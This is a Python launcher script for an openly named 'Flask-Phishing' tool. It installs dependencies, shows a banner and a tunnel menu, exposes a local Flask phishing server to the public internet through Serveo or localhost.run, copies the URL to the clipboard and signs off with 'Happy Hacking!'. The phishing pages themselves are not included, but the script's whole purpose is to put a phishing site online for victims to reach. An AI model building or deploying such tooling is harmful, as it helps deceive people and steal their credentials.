import subprocess
import os
import time
import platform
import importlib

from automation.tunnel import HOSTING



class RequirementsInstaller:

    error = ""


    def get_module_list(self):
        with open("requirements.txt","r") as f:
            mlist = [i.strip() for i in f.readlines()]
            return mlist

    def module_Installed(self,module_name):
        try:
            module = importlib.import_module(module_name)
            return True
        except ModuleNotFoundError:
            return False

    def check_platform(self):
        if platform.system() == "Windows":
            return "Windows " + platform.version()
        elif platform.system() == "Darwin":
            return "MacOs " + platform.version()
        elif platform.system() == "Linux":
            return "Linux " + platform.version()
        else:
            return None

    def run_command(self,command):
        """Runs a command and captures its output."""
        try:
            result = subprocess.run(command, capture_output=True, text=True, shell=True)
            if result.returncode == 0:
                return result.stdout
            else:
                return f"Error: {result.stderr}"
        except subprocess.CalledProcessError as e:
            return f"Error: {e}"
            pass

    def check_pip(self):
        try:
            subprocess.run(["pip", "--version"], capture_output=True, check=True)
            return True
        except subprocess.CalledProcessError:
            return False

    def check_python(self):
        try:
            subprocess.run(["python", "--version"], capture_output=True, check=True)
            return True
        except subprocess.CalledProcessError:
            return False


    def install_module(self,module_name):
        try:
            # Run pip install command
            subprocess.run(
                ['pip', 'install', module_name],
                check=True,  # This will raise a CalledProcessError if the command returns a non-zero exit status
                capture_output=True,  # Capture the output so we can print it if needed
                text=True  # Treat output as text (string) rather than bytes
            )
            return True
        except subprocess.CalledProcessError as e:
            # Print the error message for debugging
            self.error = e.stderr
            return False






class InfoGenerator(RequirementsInstaller,HOSTING):

    red = '\033[91m'
    green = '\033[92m'
    yellow = '\033[93m'
    reset = '\033[0m'
    dark_red = '\033[31m'
    magenta = '\033[35m'
    cyan = '\033[36m'
    bold = '\033[1m'
    blue = '\033[34m'



    def __init__(self):
        self.python_version = ""
        self.pip_version = ""


    def colorful_boat_banner(self):
        banner = [
            ".............................-*...................",
            "............................=%:...................",
            "..........................:=*:....................",
            "..:---:::................=#%-............:::---:..",
            "..=#%%####@@%%%%%%######**####*#%%%%%%@@#####%#=..",
            "...-#%#################**###################%%=...",
            "....+%%%%@@@@@@@@@@@@@%###@@@@@@@@@@@@@@@%%%%#-...",
            "....:=-.....:::::-----*=:-------::::::......==....",
            "......==-::::........*+..............::::--==.....",
            ".......:+@@@@@@@@##+#*%%%%%%%%%%@@@@@@@@@@#-......",
            ".........:=+**###%*#*+@@@@@@@@%@@%%%##**+-........",
            "...............+%*%*@#............................",
            ".............:+@@#*@#.............................",
            ".............:*%@@@*..............................",
            "...............:-*+...............................",
            

        ]

        colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m', '\033[97m']

        for line in banner:
            print("".join([colors[i % len(colors)] + char + '\033[0m' for i, char in enumerate(line)]))
            time.sleep(0.05)  # Add a slight delay for better visual effect
        
    def display_heading(self):
        print(f"{self.magenta}{self.bold}             * [Flask-Phishing] *{self.bold}{self.reset}\n")
        print(f"{self.green}Author:{self.red} Siddhant385{self.reset}")
        print(f"{self.green}GitHub Repo:{self.red} https://github.com/siddhant385/flask-phishg{self.reset}")
        print(f"{self.yellow}{self.bold}Please star the GitHub repo!{self.bold}{self.reset}\n\n")

    def clear(self):
        if self.check_platform().startswith("Windows"):
            command = "cls"
        elif self.check_platform().startswith("Linux"):
            command = "clear"
        os.system(command)

    def Basic_info(self):
        if self.check_python():
            self.python_version = self.run_command("python -V").strip()
        if self.check_pip():
            self.pip_version = self.run_command("pip --version").strip()

    def check_dependencies(self):
        self.basic_requirements()
        print(f"{self.yellow}[-]Checking Dependencies..{self.reset}\n\n")
        modulelist = self.get_module_list()
        not_found = []
        for modules in modulelist:
            if self.module_Installed(modules):
                print(f"{self.green}[-] {modules} Module Found {self.reset}")
            else:
                print(f"{self.dark_red}[:] {modules} Not  Found{self.reset}")
                not_found.append(modules)
            time.sleep(0.5)
        print("\n\n")
        return not_found

    def install_dependencies(self):
        not_found = self.check_dependencies()
        installed = []
        if not_found == []:
            print(f"{self.yellow}[*] ALL REQUIREMENTS SATISFIED: {self.reset}")
            return True
        print(f"{self.yellow}[*]INSTALLING DEPENDENCIES ..{self.reset}\n\n")
        for module in not_found:
            print(f"{self.yellow}[-] Installing {module} {self.reset}:",end="")
            value = self.install_module(module)
            if value:
                print(f"{self.green}True{self.reset}")
                installed.append(module)
            else:
                print(f"{self.dark_red}\n{self.error}{self.reset}")
        if not_found == installed:
            print(f"{self.yellow}[*] ALL REQUIREMENTS SATISFIED: {self.reset}")
            return True
        else:
            print(f"{self.dark_red}ERROR:{self.error} FOUND WHILE INSTALLING: MANULLAY INSTALL{self.reset}")
            print(f"{self.dark_red}Report The issue to Github with Error http://github.com/siddhant385/flask-phishing/issues{self.reset}")
            exit()

    def basic_requirements(self):
        self.Basic_info()
        print(f"{self.yellow}[*] CHECKING BASIC DEPENDENCIES: \n{self.reset}")
        time.sleep(1)
        print(f"{self.green}Python: {self.python_version} Installed {self.reset}\n")
        print(f"{self.green}PIP: {self.pip_version} Installed{self.reset}\n\n")
        time.sleep(2)

    def ShowFunction1(self):
        self.clear()
        time.sleep(2)
        self.colorful_boat_banner()
        self.display_heading()
        value = self.install_dependencies()
        if value:
            return True
        else:
            return False
    
    def PortForwardingMenuMSG(self,msg=""):
        self.clear()
        print(f"{self.yellow}{self.reset}")
        print(f"{self.red}{self.reset}")
        print(f"{self.yellow}[*]PORT FORWARDING MENU{self.reset}\n")
        print(f"{self.cyan}{self.bold}Enter the options you want to Tunnel{self.reset}\n\n")
        print(f"{self.red}1.{self.green}{self.bold}Localhost: {self.blue}[Will run only in your computer]{self.reset}\n")
        print(f"{self.red}2.{self.green}{self.bold}Serveo: {self.blue}[Will run everywhere in the internet] {self.magenta} Less Stable{self.reset}\n")
        print(f"{self.red}3.{self.green}{self.bold}localhost.run: {self.blue}[Will run in the internet]{self.magenta} More Stable{self.reset}\n")
        print(f"{self.red}{self.bold}{msg}{self.reset}")

    def PortForwardingInput(self):
        self.PortForwardingMenuMSG()
        while True:
            try:
                choice = int(input(f"{self.dark_red}Enter Your Choice: {self.reset}"))
                if choice not in [1,2,3]:
                    msg = "Please Enter Number Only of Above Choices"
                    self.PortForwardingMenuMSG(msg)
                    continue
                else:
                    print(f"{self.yellow}{self.bold}NOW CREATING A TUNNEL PLEASE WAIT..{self.reset}")
                    time.sleep(2)
                    
                    return choice-1
            except ValueError:
                msg = "Please Enter Number not Alphabets or any other symbols"
                self.PortForwardingMenuMSG(msg)
    

    def CreateTunnelandFlask(self):
        try:
            optiontochoose = ["localhost",self.start_serveo,self.start_localhost]
            choice = self.PortForwardingInput()
            if optiontochoose[choice] == "localhost":
                url = "http://127.0.0.1:8000"
            else:
                Ip_process = optiontochoose[choice](8000)
                url = self.getURL()
            self.clear()
            flask_process = self.start_flask_app()
            print(f"{self.yellow}[*]STARTING FLASK: {self.reset}\n")
            print(f"{self.yellow}[*]STARTING SERVICES : {self.reset}\n")
            print(f"{self.cyan}[-]Please wait a little Patience is a sweet thing..{self.reset}\n")
            self.clear()
            print(f"{self.magenta}Press{self.red}{self.bold} Ctrl+C {self.magenta} to exit{self.reset}\n")
            time.sleep(1)
            import clipman as cl
            try:
                cl.init()
                cl.set(url)
                print(f"{self.dark_red}Your Url is also copied to clipboard open it in browser{self.green}{self.bold}\n\nHappy Hacking!{self.reset}\n")
            except cl.exceptions.NoEnginesFoundError as e:
                print(f"{self.red}{self.bold}Can't copy to clipboard No engines found: {e}{self.reset}\n")


            time.sleep(1)
            print(f"{self.red}{self.bold}OPEN URL IN BROWSER : {self.green}{url}{self.reset}\n")
            time.sleep(1)
            while True:
                pass
        except KeyboardInterrupt:
            print(f"\n{self.red}Closing Services.{self.reset}\n")
            flask_process.terminate()
            print(f"{self.red}Closed Flask{self.reset}\n")
            if not optiontochoose[choice] == "localhost":
                Ip_process.terminate()
            print(f"{self.dark_red}{self.bold}Leave A Start In Github\n\n{self.blue}{self.bold}Bye Bye{self.reset}\n")




    
    def start_flask_app(self):
        process = subprocess.Popen(['python', 'main.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process



            

    
        

    
if __name__ == "__main__":
    i = InfoGenerator()
    i.ShowFunction1()
    i.CreateTunnelandFlask()
